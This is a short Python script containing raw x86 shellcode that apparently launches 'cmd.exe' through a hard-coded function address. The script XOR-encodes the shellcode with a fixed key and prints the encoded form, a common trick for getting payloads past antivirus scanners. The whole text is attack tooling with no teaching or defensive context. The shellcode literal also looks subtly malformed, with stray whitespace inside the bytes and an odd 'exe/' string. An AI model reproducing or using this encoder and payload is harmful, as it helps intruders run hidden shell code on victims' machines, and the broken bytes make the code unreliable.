
shellcode = b"\x8b\xec\x55\x8b\xec\
		\x68\x65\x78\x65\x2F \
		\x68\x63\x6d\x64\x2e \
		\x8d\x45\xf8\x50\xb8\
		\xc7\x93\xc2\x77 \
		\xff\xd0"


encrypted_shellcode = ""
key = 35
for i in shellcode:

	encrypted_shellcode += hex(i^ key).replace('0x','\\x')
print('"'+encrypted_shellcode+'";')

